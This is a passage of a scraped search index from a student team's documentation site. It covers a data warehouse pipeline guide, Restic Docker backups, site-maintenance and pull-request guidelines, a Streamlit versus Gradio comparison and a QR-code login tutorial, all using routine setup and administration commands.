via Kafka → trigger Airflow DAG to:  Run object detection, classification, or sentiment analysisStore results back into MongoDB or DremioNotify user via FastAPI return or log entry  Data Cataloging or Metadata Extraction​  Trigger a DAG when a new file is added to MinIO that:  Reads basic metadata (rows, columns, types)Tags the file or stores metadata in PostgreSQLOptionally emails or posts a summary to Teams/Slack  Real-Time Dashboard Updating​  Send sensor data or user entries via Kafka → DAG aggregates &amp; stores latest stats → Dashboards pull new numbers without delay    ","version":"Next","tagName":"h3"},{"title":"How to Reuse This Pipeline​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#how-to-reuse-this-pipeline","content":" You don’t need to build a new Kafka setup. Just follow these steps:  Step 1: Create a Kafka Topic (Optional)​  Ask the DW team to help create a new topic (e.g., project5-cleaning-topic) or reuse an existing one.  Step 2: Write Your Airflow DAG​  Your DAG should:  Listen for an incoming trigger (e.g., a filename, ID, or metadata)Fetch the related file or dataPerform the required task (cleaning, prediction, merging, etc.)Optionally publish back to Kafka or save to a storage system  Example DAG trigger:  @dag(schedule_interval=None) def clean_csv_on_trigger(): # Pulls file info from Kafka or API # Runs cleaning steps # Stores clean file to MinIO Silver bucket   documentation on this currently Work in progress. For now, this is the link of repository which contains the readme file and other information Kafka and airflow stack  Sure! Here's the updated version of the Data Warehouse Administration section in clean Markdown:  ","version":"Next","tagName":"h3"},{"title":"Administrative Services Overview​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#administrative-services-overview","content":" Beyond the core upload and query systems, the Redback Data Warehouse includes several under-the-hood services for tracking, recovery, and observability — mostly handled by the admin or DW lead.  ","version":"Next","tagName":"h2"},{"title":"Data Provenance Pipeline​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#data-provenance-pipeline","content":" A provenance pipeline was introduced to track system-level changes across services — including uploads, deletions, access logs, and transformations.  It uses the ELK Stack (Elasticsearch, Logstash, Kibana) with PostgreSQL as a central provenance store.  Elasticsearch: Stores logs as JSON, searchable via: MinIO LogsUpload Logs Logstash: Parses logs and forwards them to Elasticsearch. Kibana: Optional frontend for dashboarding. Available at http://10.137.0.149:5601 PostgreSQL: Long-term metadata store; access it using: docker exec -it postgres psql -U &lt;username&gt; -d &lt;database-name&gt;   Note: No dashboards have been set up in Kibana yet, but the stack is running and can be extended.  click here to view detailed information on this    ","version":"Next","tagName":"h3"},{"title":"Final Notes​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#final-notes","content":" This guide has aimed to provide a complete and current overview of the Redback Data Warehouse ecosystem — from data ingestion and processing to storage, querying, and backup. Whether you're a new contributor or a returning team member, this documentation should help you navigate the platform, understand the role of each component, and collaborate more effectively across teams.  As the platform evolves, so will this guide. If you notice missing pieces or have improvements to suggest, please contribute or notify the current Data Warehouse lead. Let’s keep building better data infrastructure — together.    version 1 - Document prepared by Daezel Goyal, Data Warehouse Leader – Redback Operations, May 2025 ","version":"Next","tagName":"h2"},{"title":"Data Warehouse Restic-Docker Backup System","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Restic/","content":"","keywords":"","version":"Next"},{"title":"Features​","type":1,"pageTitle":"Data Warehouse Restic-Docker Backup System","url":"/redback-documentation/docs/data-warehousing/Restic/#features","content":" Automated Backups: Back up multiple Docker volumes using Restic.Snapshot Management: Easily manage and restore snapshots.Customizable: Modify the backup script to suit your needs.    ","version":"Next","tagName":"h2"},{"title":"Prerequisites​","type":1,"pageTitle":"Data Warehouse Restic-Docker Backup System","url":"/redback-documentation/docs/data-warehousing/Restic/#prerequisites","content":" Docker: Ensure Docker is installed on your system. Install Docker.Docker Compose: Ensure Docker Compose is installed. Install Docker Compose.    ","version":"Next","tagName":"h2"},{"title":"Setup Instructions​","type":1,"pageTitle":"Data Warehouse Restic-Docker Backup System","url":"/redback-documentation/docs/data-warehousing/Restic/#setup-instructions","content":" ","version":"Next","tagName":"h2"},{"title":"1. Clone the Repository​","type":1,"pageTitle":"Data Warehouse Restic-Docker Backup System","url":"/redback-documentation/docs/data-warehousing/Restic/#1-clone-the-repository","content":" git clone https://github.com/Redback-Operations/redback-data-warehouse.git cd restic   ","version":"Next","tagName":"h3"},{"title":"2. Restic Monitors and Backs Up the Following Volumes​","type":1,"pageTitle":"Data Warehouse Restic-Docker Backup System","url":"/redback-documentation/docs/data-warehousing/Restic/#2-restic-monitors-and-backs-up-the-following-volumes","content":" Restic is configured to back up data from several external Docker volumes on Redback VM. Before running the backup system, make sure these volumes exist.  data-lakehouse_minio-data data-lakehouse_minio-config fileuploadservice_dremio-data dp-postgres-data dp-es-data dp-logstash-data   Run the following commands to create them:  docker volume create data-lakehouse_minio-data docker volume create data-lakehouse_minio-config docker volume create fileuploadservice_dremio-data docker volume create dp-postgres-data docker volume create dp-es-data docker volume create dp-logstash-data   ","version":"Next","tagName":"h3"},{"title":"3. Configure Restic Password​","type":1,"pageTitle":"Data Warehouse Restic-Docker Backup System","url":"/redback-documentation/docs/data-warehousing/Restic/#3-configure-restic-password","content":" Create a restic-password.txt file in the project directory and add your Restic repository password:  your-secure-password   ","version":"Next","tagName":"h3"},{"title":"4. Make Scripts Executable​","type":1,"pageTitle":"Data Warehouse Restic-Docker Backup System","url":"/redback-documentation/docs/data-warehousing/Restic/#4-make-scripts-executable","content":" Ensure the backup script is executable:  chmod +x scripts/backup.sh     ","version":"Next","tagName":"h3"},{"title":"Running the Backup System​","type":1,"pageTitle":"Data Warehouse Restic-Docker Backup System","url":"/redback-documentation/docs/data-warehousing/Restic/#running-the-backup-system","content":" ","version":"Next","tagName":"h2"},{"title":"Start the Restic Container​","type":1,"pageTitle":"Data Warehouse Restic-Docker Backup System","url":"/redback-documentation/docs/data-warehousing/Restic/#start-the-restic-container","content":" Run the following command to start the Restic container:  docker-compose up -d   ","version":"Next","tagName":"h3"},{"title":"Verify the Logs​","type":1,"pageTitle":"Data Warehouse Restic-Docker Backup System","url":"/redback-documentation/docs/data-warehousing/Restic/#verify-the-logs","content":" Check the logs of the Restic container to ensure backups are running:  docker logs -f restic-backup     ","version":"Next","tagName":"h3"},{"title":"Managing Snapshots​","type":1,"pageTitle":"Data Warehouse Restic-Docker Backup System","url":"/redback-documentation/docs/data-warehousing/Restic/#managing-snapshots","content":" ","version":"Next","tagName":"h2"},{"title":"List Available Snapshots​","type":1,"pageTitle":"Data Warehouse Restic-Docker Backup System","url":"/redback-documentation/docs/data-warehousing/Restic/#list-available-snapshots","content":" To list all available snapshots, run:  docker exec -it restic-backup sh   ","version":"Next","tagName":"h3"},{"title":"Restore a Snapshot​","type":1,"pageTitle":"Data Warehouse Restic-Docker Backup System","url":"/redback-documentation/docs/data-warehousing/Restic/#restore-a-snapshot","content":" To restore a specific snapshot, use the following command:  restic restore &lt;snapshot-id&gt; --target &lt;target-directory&gt;   Replace &lt;snapshot-id&gt; with the ID of the snapshot you want to restore.  ","version":"Next","tagName":"h3"},{"title":"Access Restored Files​","type":1,"pageTitle":"Data Warehouse Restic-Docker Backup System","url":"/redback-documentation/docs/data-warehousing/Restic/#access-restored-files","content":" The restored files will be available in the ./restore directory on your host machine.    ","version":"Next","tagName":"h3"},{"title":"Stopping the Backup System​","type":1,"pageTitle":"Data Warehouse Restic-Docker Backup System","url":"/redback-documentation/docs/data-warehousing/Restic/#stopping-the-backup-system","content":" To stop the Restic container, run:  docker-compose down     ","version":"Next","tagName":"h2"},{"title":"Notes​","type":1,"pageTitle":"Data Warehouse Restic-Docker Backup System","url":"/redback-documentation/docs/data-warehousing/Restic/#notes","content":" Ensure all required volumes are created before starting the container.Modify the backup.sh script to customize the backup process.Use docker-compose logs to troubleshoot any issues.    ","version":"Next","tagName":"h2"},{"title":"Resources​","type":1,"pageTitle":"Data Warehouse Restic-Docker Backup System","url":"/redback-documentation/docs/data-warehousing/Restic/#resources","content":" Restic DocumentationDocker DocumentationDocker Compose Documentation ","version":"Next","tagName":"h2"},{"title":"Future Plans","type":0,"sectionRef":"#","url":"/redback-documentation/docs/documentation-maintenance/future-plans","content":"","keywords":"","version":"Next"},{"title":"Add GitHub Actions Checklist​","type":1,"pageTitle":"Future Plans","url":"/redback-documentation/docs/documentation-maintenance/future-plans#add-github-actions-checklist","content":" Add syntax to the GitHub Actions to automatically flag common mistakes, this will reduce repeating the same answers to pull requests constantly.  ","version":"Next","tagName":"h3"},{"title":"Enforcement (and back-dated) Naming Schemes​","type":1,"pageTitle":"Future Plans","url":"/redback-documentation/docs/documentation-maintenance/future-plans#enforcement-and-back-dated-naming-schemes","content":" Ideally, all files and folders should have the same naming scheme. Currently, they are a mix of everything.  ","version":"Next","tagName":"h3"},{"title":"Image Folder Structure​","type":1,"pageTitle":"Future Plans","url":"/redback-documentation/docs/documentation-maintenance/future-plans#image-folder-structure","content":" Images should be enforced to have their own sub-folders, as currently most pages will just dump all their images into the img folder for that main folder. Likewise, all images should have a consistent naming scheme to make them identifiable to the file they are associated with.  ","version":"Next","tagName":"h3"},{"title":".gitignore yarn and package locks​","type":1,"pageTitle":"Future Plans","url":"/redback-documentation/docs/documentation-maintenance/future-plans#gitignore-yarn-and-package-locks","content":" These often have conflicts in PRs, they can possibly be added to .gitignore, but this will require research and trialling.  ","version":"Next","tagName":"h3"},{"title":"Revamp Tutorials​","type":1,"pageTitle":"Future Plans","url":"/redback-documentation/docs/documentation-maintenance/future-plans#revamp-tutorials","content":" Create more sophisticated, easier to understand tutorials. As well as more advanced tutorials covering some of the plugins and other advanced tools on offer.  ","version":"Next","tagName":"h3"},{"title":"Homepage Revamp​","type":1,"pageTitle":"Future Plans","url":"/redback-documentation/docs/documentation-maintenance/future-plans#homepage-revamp","content":" Currently the homepage is using the default Docusaurus template, Redback should utilise the skills on offer to make this more appealing. ","version":"Next","tagName":"h3"},{"title":"General Info For Maintainers","type":0,"sectionRef":"#","url":"/redback-documentation/docs/documentation-maintenance/general-info","content":"","keywords":"","version":"Next"},{"title":"General​","type":1,"pageTitle":"General Info For Maintainers","url":"/redback-documentation/docs/documentation-maintenance/general-info#general","content":" This platform is based on Docusaurus. They have some amazing documnetation here. Especially their plugins, lots of good future improvements to the site there.If for whatever reason you need to manually deploy the site (as in the auto-deployment is not working). Open Git Bash to the location of the repo, and type GIT_USER=&lt;YOUR USERNAME&gt; yarn deploy. This needs to be done by an admin of the repo.Try and ensure that students have decent names for their files and pages.Ensure that proper file structure is followed (see tutorials for info).Previous web lead has done a lot of cool extensions for the site such as this scrolling section, look through the web section for more examples.  ","version":"Next","tagName":"h2"},{"title":"Errors​","type":1,"pageTitle":"General Info For Maintainers","url":"/redback-documentation/docs/documentation-maintenance/general-info#errors","content":" Given pages are typically reviewed in the PR stage, most errors will be found during the auto deployment builds. Before approving PRs, please ensure you press &quot;approve run&quot; in the workflow block. If this returns an error, have a look! The most common are:  Unexpected character `/` (U+002F) before local name, expected a character that can start a name, such as a letter, `$`, or `_` (note: to create a link in MDX, use `[text](url)`)   This is a URL not formatted properly. Ensure it is either using markdown [text](url) or in plain text. This sometimes occurs when code blocks have not been used on code.    Error: MDX compilation failed for file &quot;/home/runner/work/redback-documentation/redback-documentation/docs/cybersecurity/research/ids-and-wazuh/gap-analysis.md&quot; Cause: Image docs/cybersecurity/research/ids-and-wazuh/img/wazuh1.png used in docs/cybersecurity/research/ids-and-wazuh/gap-analysis.md not found.   This can be multiple things. Either the image is simply not present; the casing is wrong &quot;image.png&quot; vs &quot;Image.pmg&quot; vs &quot;image.PNG&quot; are all different, it needs to match in both the file and reference. Otherwise, check that the path is correct. ","version":"Next","tagName":"h2"},{"title":"Streamlit vs Gradio","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/Streamlit-vs-Gradio","content":"","keywords":"","version":"Next"},{"title":"INTRODUCTION​","type":1,"pageTitle":"Streamlit vs Gradio","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/Streamlit-vs-Gradio#introduction","content":" Streamlit and Gradio are popular open-source frameworks that simplify the process of transforming complex machine learning models into interactive applications. They cater to the needs of developers and data scientists, each offering distinct features and benefits.  Streamlit: Empowering Data Apps  Overview: Streamlit is celebrated for its simplicity and flexibility, allowing developers to convert data scripts into shareable web apps effortlessly.  ","version":"Next","tagName":"h2"},{"title":"Key Features​","type":1,"pageTitle":"Streamlit vs Gradio","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/Streamlit-vs-Gradio#key-features","content":" Rapid Prototyping: Streamlit’s intuitive syntax enables quick prototyping, with instant updates upon saving the script.Customization: Offers predefined widgets and supports personalized themes and layouts.Wide Language Support: Primarily Python-based but supports multiple languages.Seamless Integration: Integrates smoothly with libraries like Matplotlib, Plotly, and pandas for dynamic visualizations.Deployment: Easy deployment on various platforms, including cloud services and local servers.  Gradio: Simplifying Model Deployment  Overview: Gradio focuses on easing model deployment with user-friendly interfaces, targeting both technical and non-technical users.  ","version":"Next","tagName":"h2"},{"title":"Key Features​","type":1,"pageTitle":"Streamlit vs Gradio","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/Streamlit-vs-Gradio#key-features-1","content":" Interface Generation: Automatically generates interfaces using a straightforward Python API.Variety of Input Types: Supports diverse input types, such as images, text, and audio.Multi-Model Integration: Facilitates ensemble deployments and model comparisons.Shareable URLs: Allows easy collaboration by sharing model interfaces as URLs.Adversarial Robustness: Provides protection against adversarial attacks, enhancing model security.  Comparison and Considerations  ","version":"Next","tagName":"h2"},{"title":"Commonalities​","type":1,"pageTitle":"Streamlit vs Gradio","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/Streamlit-vs-Gradio#commonalities","content":" Ease of Use: Both platforms simplify the deployment process, even for non-technical users.Interactive Visualizations: Enable the creation of visually appealing and interactive dashboards.Community Support: Both have active communities offering resources, tutorials, and extensions.  ","version":"Next","tagName":"h2"},{"title":"Differences​","type":1,"pageTitle":"Streamlit vs Gradio","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/Streamlit-vs-Gradio#differences","content":" Customization: Streamlit offers more customization options for app appearance and functionality.Multi-Model Deployment: Gradio excels in multi-model deployment, ideal for projects involving multiple models.Ease of Sharing: Gradio’s shareable URLs enhance collaboration and stakeholder engagement.Robustness: Gradio’s adversarial robustness features provide an added security layer for sensitive applications.  Choosing between Streamlit and Gradio depends on specific project requirements and the target audience. Streamlit is ideal for projects needing advanced customization and wide integration options, while Gradio is better suited for projects requiring ease of use, multi-model deployment, and robust security features. By understanding the strengths of each platform, developers can make informed decisions to meet their AI deployment goals.    Reference: Gradio vs. Streamlit Comparison on StackShare ","version":"Next","tagName":"h2"},{"title":"Pull Request Approval Guide For Redback-Documentation","type":0,"sectionRef":"#","url":"/redback-documentation/docs/documentation-maintenance/approval-guide","content":"","keywords":"","version":"Next"},{"title":"sidebar_position​","type":1,"pageTitle":"Pull Request Approval Guide For Redback-Documentation","url":"/redback-documentation/docs/documentation-maintenance/approval-guide#sidebar_position","content":" Most commonly missed is this value that is essential to every markdown file hosted here. sidebar_position determines the position on the sidebar, without this sometimes files fail to display. It should appear at the very top of the file in the metadata section. Other variables that can be added are title (overwriting the existing title, which is the first header) and description (overwriting the existing description, which is the first line of text after the main title). The implementation will look like the following:  --- sidebar_position: x ---   With x being the position. For new files, it is suggested to use the number of files in the folder as x, as this will place theirs at the bottom. If you have something that should always be at the bottom, set it as 99. If two files have the same value, they will sort alphabetically.  ","version":"Next","tagName":"h2"},{"title":"_category_.json​","type":1,"pageTitle":"Pull Request Approval Guide For Redback-Documentation","url":"/redback-documentation/docs/documentation-maintenance/approval-guide#_category_json","content":" In a similar fashion, _category_.json is a file that each individual folder needs, whether it be a main folder (project-1 for example), or a sub-folder (project-1/iot). This file determines the display values for the folder, such as the name, description, and position. Ensure all new folders have this file included, otherwise the folder (and all contents) will not display. The _category_.json for the documentation-maintenance folder is below:  { &quot;label&quot;: &quot;Documentation Maintenance&quot;, &quot;position&quot;: 99, &quot;link&quot;: { &quot;type&quot;: &quot;generated-index&quot;, &quot;description&quot;: &quot;Guides for ongoing maintenance of this platform&quot; } }   ","version":"Next","tagName":"h2"},{"title":"Heading Structure​","type":1,"pageTitle":"Pull Request Approval Guide For Redback-Documentation","url":"/redback-documentation/docs/documentation-maintenance/approval-guide#heading-structure","content":" Ensure that the very first title is a singular #, with the following beginning from ##.  ","version":"Next","tagName":"h2"},{"title":"PDF Files​","type":1,"pageTitle":"Pull Request Approval Guide For Redback-Documentation","url":"/redback-documentation/docs/documentation-maintenance/approval-guide#pdf-files","content":" PDFs can be embeded, but this must be done correctly. Ensure the display document is .mdx rather than .md.  The actual PDF file needs to be saved in the static/pdf folder. This is case sensitive. Once deployed, the file will have the URL https://redback-operations.github.io/redback-documentation/pdf/&lt;file name.pdf&gt;.  Once the PDF file is saved, in the .mdx file, insert the following code, with &lt;file&gt;.pdf being the name of the PDF saved in static/pdf.  &lt;embed src=&quot;https://redback-operations.github.io/redback-documentation/pdf/&lt;file&gt;.pdf&quot; type=&quot;application/pdf&quot; width=&quot;100%&quot; height=&quot;800px&quot; /&gt;   ","version":"Next","tagName":"h2"},{"title":"Naming Conventions​","type":1,"pageTitle":"Pull Request Approval Guide For Redback-Documentation","url":"/redback-documentation/docs/documentation-maintenance/approval-guide#naming-conventions","content":" Whilst only loosely monitored, ideally files and folders should be either kebab-case or Title Case.  ","version":"Next","tagName":"h2"},{"title":"Code Blocks​","type":1,"pageTitle":"Pull Request Approval Guide For Redback-Documentation","url":"/redback-documentation/docs/documentation-maintenance/approval-guide#code-blocks","content":" Often, large chunks of code is included without being included in code blocks. In that case, the website will try to interpret the code, which can cause errors. Ensure all code, however small or big, is wrapped in single line or multi-line code blocks.  ","version":"Next","tagName":"h2"},{"title":"Sensitive, Technical, And Irrelevant Data​","type":1,"pageTitle":"Pull Request Approval Guide For Redback-Documentation","url":"/redback-documentation/docs/documentation-maintenance/approval-guide#sensitive-technical-and-irrelevant-data","content":" If a document is submitted with technical data, please look over it carefully (or get someone from the Cyber Security team) to ensure no data has been leaked that may be sensitive to any projects or personal info.  Similarly, large portions of irrelevant data may not be ideal for this platform. Documents should also be checked for AI generation, if this is suspected, consult with mentors for next steps, however these should not be hosted (unless they are explicitly stated as AI generated) due to Deakin AI Policies. s ","version":"Next","tagName":"h2"},{"title":"Demonstration & documentation","type":0,"sectionRef":"#","url":"/redback-documentation/docs/example/","content":"","keywords":"","version":"Next"},{"title":"Duplicate me!​","type":1,"pageTitle":"Demonstration & documentation","url":"/redback-documentation/docs/example/#duplicate-me","content":" important Make sure to update the _category_.json to have the correct title and position (this will determine the position on the sidebar)  ","version":"Next","tagName":"h2"},{"title":"I'm just a markdown file​","type":1,"pageTitle":"Demonstration & documentation","url":"/redback-documentation/docs/example/#im-just-a-markdown-file","content":" Find within the Example folder the minimum files and folders needed.  danger Do things like this  or this  Have some numbers  Add some links  or some images​    ","version":"Next","tagName":"h3"},{"title":"Documentation examples here​","type":1,"pageTitle":"Demonstration & documentation","url":"/redback-documentation/docs/example/#documentation-examples-here","content":" Docusaurus MarkdownMarkdown Guide  ","version":"Next","tagName":"h2"},{"title":"And tables!​","type":1,"pageTitle":"Demonstration & documentation","url":"/redback-documentation/docs/example/#and-tables","content":" blah\tblah\tblahtest\ttest\ttest test\ttest\ttest ","version":"Next","tagName":"h2"},{"title":"Math Equation Testing","type":0,"sectionRef":"#","url":"/redback-documentation/docs/documentation-maintenance/math-test","content":"Last updated by: SassafrasAU, Last updated on: '08/09/2024' Last updated by: SassafrasAU, Last updated on: '08/09/2024' Math Equation Testing I=∫02πsin⁡(x) dxI = \\int_0^{2\\pi} \\sin(x)\\,dxI=∫02π​sin(x)dx Let f ⁣:[a,b]→Rf\\colon[a,b]\\to\\Rf:[a,b]→R be Riemann integrable. Let F ⁣:[a,b]→RF\\colon[a,b]\\to\\RF:[a,b]→R beF(x)=∫axf(t) dtF(x)=\\int_{a}^{x} f(t)\\,dtF(x)=∫ax​f(t)dt. Then FFF is continuous, and at all xxx such thatfff is continuous at xxx, FFF is differentiable at xxx with F′(x)=f(x)F'(x)=f(x)F′(x)=f(x).","keywords":"","version":"Next"},{"title":"BUGBOX QR-Code Solution Tutorial","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/BugBox-Streamlit-Tutorial","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"BUGBOX QR-Code Solution Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/BugBox-Streamlit-Tutorial#introduction","content":" The purpose of this project was to design a user-friendly game login page for school kids. Given that the target audience is children, the solution emphasizes simplicity by utilizing QR codes instead of traditional ID and password combinations, which can be cumbersome and easy to forget. The game is intended for school kids, with staff members playing a role in managing the game. Therefore, a staff login and access page has been incorporated, allowing staff members to view the list of students participating in the game. The system ensures that major functionalities are controlled by an admin, whose credentials are predefined in the code.  To achieve this, we leveraged Streamlit, a Python-based framework known for its ease of use and extensive library support. Streamlit provides several built-in functions that made it simple to implement features like QR code generation and handling, which are central to this application.  ","version":"Next","tagName":"h2"},{"title":"Technologies Used​","type":1,"pageTitle":"BUGBOX QR-Code Solution Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/BugBox-Streamlit-Tutorial#technologies-used","content":" Streamlit: Chosen for its simplicity and powerful built-in functions, especially for creating web applications quickly with minimal code. Streamlit's built-in libraries made it easy to generate and manage QR codes, which are crucial for the kid-friendly login process. If you're new to Streamlit or need help setting it up, please refer to the Streamlit Tutorialincluded in the project folder. SQLite: Used as the database to store information about students and staff members. SQLite is lightweight, easy to set up, and integrates well with Python applications, making it ideal for this project. bcrypt: Employed for hashing passwords to ensure secure storage in the database. bcrypt is a robust library for password hashing, which helps protect against unauthorized access by securely storing password hashes instead of plaintext passwords. Python Libraries: qrcode: Used to generate QR codes from the unique IDs created for each student. This library makes it easy to create QR codes that can be scanned to log in.PIL (Python Imaging Library): Utilized extensively for image manipulation, including creating QR codes, adding captions to images, and other visual elements. PIL provides robust tools for handling image files, making it integral to the QR code functionality in this project.pyzbar: A crucial library for decoding QR codes from images. This library is used to interpret the QR codes when scanned, allowing the system to retrieve and process student information during the login process.cv2 (OpenCV): Employed to capture images from a webcam, which are then processed to scan QR codes. OpenCV is a powerful library for computer vision tasks, making it an excellent choice for integrating real-time QR code scanning.numpy: Utilized for handling arrays and matrices, which are fundamental in processing images captured by the webcam. numpy is highly efficient and plays a significant role in the backend processing of image data.zipfile: Used for compressing multiple QR codes into a single ZIP file for easy download.pandas: Used for data manipulation and export functionalities. Pandas allows for easy handling of data, including exporting student lists to CSV files. This library simplifies working with structured data in Python.io.BytesIO: Utilized for in-memory binary streams, making it easier to handle images and data without needing to write to the disk. This is especially useful in scenarios like dynamically generating and downloading QR codes.  ","version":"Next","tagName":"h3"},{"title":"Setup Instructions​","type":1,"pageTitle":"BUGBOX QR-Code Solution Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/BugBox-Streamlit-Tutorial#setup-instructions","content":" ","version":"Next","tagName":"h2"},{"title":"Prerequisites​","type":1,"pageTitle":"BUGBOX QR-Code Solution Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/BugBox-Streamlit-Tutorial#prerequisites","content":" Before you begin, ensure you have the following installed on your system:  Python: The project requires Python 3.7 or later. You can download it from python.org.Streamlit: Streamlit is the framework used to run this application. If you are unfamiliar with Streamlit or need to install it, please refer to the Streamlit Tutorialincluded in the project folder.  ","version":"Next","tagName":"h3"},{"title":"Installation​","type":1,"pageTitle":"BUGBOX QR-Code Solution Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/BugBox-Streamlit-Tutorial#installation","content":" Clone the Repository: To get started, you need to clone the repository where this project is hosted. Run the following command in your terminal: git clone &lt;repository-url&gt; Replace &lt;repository-url&gt; with the actual URL of the repository. Navigate to the Project Directory: After cloning, navigate to the directory where the project files are located: cd &lt;project-directory&gt; Install Dependencies: The project has a list of dependencies specified in the requirements.txt file. Install these dependencies by running: pip install -r requirements.txt   ","version":"Next","tagName":"h3"},{"title":"Environment Setup​","type":1,"pageTitle":"BUGBOX QR-Code Solution Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/BugBox-Streamlit-Tutorial#environment-setup","content":" Create a .env File: For security reasons, sensitive information like database credentials are not hardcoded into the application. Instead, they are stored in a .env file. Use the .env.sample file provided in the project as a template to create your .env file. The .env file should contain your environment-specific settings. Your .env file should be structured as follows: ADMIN_PASSWORD=&quot;&lt;admin-password&gt;&quot; Run the Application: Once all dependencies are installed and your environment variables are set, you can run the application by navigating to the directory containing the Streamlit files and running: streamlit run &lt;filename&gt;.py Replace &lt;filename&gt;.py with the name of the Python file that contains the main Streamlit application, such as app.py or game_login.py. Admin Setup: The admin user must ensure that the .env file is correctly set up with the necessary credentials as outlined above. This file will be critical for accessing various services securely within the application.  ","version":"Next","tagName":"h3"},{"title":"Additional Notes​","type":1,"pageTitle":"BUGBOX QR-Code Solution Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/BugBox-Streamlit-Tutorial#additional-notes","content":" Database Initialization: The SQLite database (school_kids.db) will be automatically created if it does not already exist when the application runs for the first time.Updating Passwords: If you need to update the admin password or add new staff members, ensure you follow the secure password hashing procedures described in the project.QR Code Handling: The application automatically generates and handles QR codes for student logins. Ensure your webcam is properly configured to scan QR codes when using the login feature. (For instance, make sure camera is not already in use, like in live meeting with camera on, the app will not be able to detect QR Code In that case)  ","version":"Next","tagName":"h3"},{"title":"Database Setup​","type":1,"pageTitle":"BUGBOX QR-Code Solution Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/BugBox-Streamlit-Tutorial#database-setup","content":" ","version":"Next","tagName":"h2"},{"title":"Creating the Database​","type":1,"pageTitle":"BUGBOX QR-Code Solution Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/BugBox-Streamlit-Tutorial#creating-the-database","content":" The database used in this project is SQLite, and it stores all necessary data for both students and staff. The database file (school_kids.db) will be created automatically when you first run the application.  However, if you want to manually set up or modify the database, follow these steps:  Navigate to the Project Directory: Open your terminal and navigate to the directory where your project files are located. Run the Python Script to Set Up the Database: The database and necessary tables (students and staff) are automatically created by the provided Python script. Simply run the application to generate the database: streamlit run &lt;your_script_name&gt;.py   ","version":"Next","tagName":"h3"},{"title":"Modifying the Database​","type":1,"pageTitle":"BUGBOX QR-Code Solution Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/BugBox-Streamlit-Tutorial#modifying-the-database","content":" If you want to modify the database or manually inspect its contents:  Access SQLite Command-Line Interface: Open your terminal and start the SQLite command-line interface by typing: sqlite3 school_kids.db This command opens an SQLite prompt where you can execute SQL commands to modify or inspect the database. List Existing Tables: To see the tables in your database, run: .tables View Contents of a Table: To view the contents of the staff table, for example, run: SELECT * FROM staff; Modify the Database: You can use any valid SQLite commands to make changes to the database. For example, to update a staff member's role, you might use: UPDATE staff SET role = 'admin' WHERE username = 'example_user'; Exit the SQLite Command-Line Interface: To exit SQLite, type: .exit   By following these instructions, you can set up, modify, and manage the SQLite database used in this project. Additionally, you have the flexibility to use all other SQLite commands to perform any further customizations or modifications to the database.  ","version":"Next","tagName":"h3"},{"title":"Application Features​","type":1,"pageTitle":"BUGBOX QR-Code Solution Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/BugBox-Streamlit-Tutorial#application-features","content":" ","version":"Next","tagName":"h2"},{"title":"User Authentication​","type":1,"pageTitle":"BUGBOX QR-Code Solution Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/BugBox-Streamlit-Tutorial#user-authentication","content":" Login Process: The application uses a secure login system where staff members can log in using their username and password. The passwords are hashed using the bcrypt library before being stored in the database, ensuring that even if the database is compromised, the plaintext passwords are not exposed.During the login process, the entered password is hashed and compared against the stored hashed password using bcrypt.checkpw. If the passwords match, the user is authenticated and granted access to the application. Role-Based Access Control: The application implements a role-based access control (RBAC) mechanism to restrict access to certain features. There are two roles: admin and user.Admins have access to all features, including managing staff members and downloading QR codes. Regular users have limited access and can only perform basic actions such as logging in and viewing student data.This control ensures that sensitive operations, like adding new staff members or viewing the complete list of students, are restricted to authorized personnel only. Multiple Tabs Functionality: The application is organized into multiple tabs, each serving a specific purpose: Login Tab: Allows students to log in using their QR codes.Generate QR Code Tab: Helps generate new QR codes for students.Staff Login Tab: Provides login access for staff members and admins, with additional features for admins.Recover QR Code Tab: Allows students or staff to regenerate and download lost QR codes.  ","version":"Next","tagName":"h3"},{"title":"QR Code Generation and Management​","type":1,"pageTitle":"BUGBOX QR-Code Solution Tutorial","url":"/redback-documentation/docs/data-warehousing/Streamlit tutorial/BugBox-Streamlit-Tutorial#qr-code-generation-and-management","content":" QR Code Generation: The application generates QR codes for each student based on their unique ID, which is constructed from their personal information such as grade, class letter, and roll number.The qrcode library is used to create these QR codes. The generated QR code images are then stored temporarily in memory for display and download. QR Code Login: Regular users (students) can log in using their QR codes. This feature is designed to be simple and user-friendly, making it easy for children to access the game without needing to remember complex passwords. QR Code Storage: Although the QR codes are primarily used in-memory, they can also be downloaded by the user. The download_all_qr_codes function allows admins to download all QR codes in a single ZIP file. This function includes security checks to ensure that only authorized users (admins) can access this feature. Additionally, the unique IDs are sanitized to prevent any potential security issues during file operations. File Operations Security: In the 